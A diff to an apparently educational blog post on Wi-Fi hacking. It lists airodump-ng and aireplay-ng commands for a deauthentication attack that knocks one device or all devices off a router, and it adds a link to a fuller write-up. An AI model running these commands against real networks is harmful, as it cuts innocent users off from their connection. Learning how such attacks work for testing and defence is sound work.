@@ -37,7 +37,8 @@ Now we enter one of the most interesting parts of the post. Have you ever had so
 * Turn on the monitor mode as described above.
 * Run `airdump-ng wlan0mon`. This command will give you a list of routers available in your vicinity. Note down the `BSSID` and the `channel number (CH)` of the desired router. 
 * Run `airodump-ng wlan0mon --bssid [router's BSSID here] --channel [router's channel here]` and you will get a list of devices connected to the router. If there is a particular device you need to disconnect, note down its [MAC Address](https://en.wikipedia.org/wiki/MAC_address).
-* Now the final part, run `aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon`. If you skip the `-c` flag part, it deuathenticates all devices connected to the router. The devices won't be able to connect again unless you stop the attack by pressing `Control+C`.
+* Now the final part, run `aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon`. If you skip the `-c` flag part, it deuathenticates all devices connected to the router. The devices won't be able to connect again unless you stop the attack by pressing `Control+C`.<br>
+If you wish to learn about all these steps in more detail, [read here](https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142).
 
 
 # Conclusion
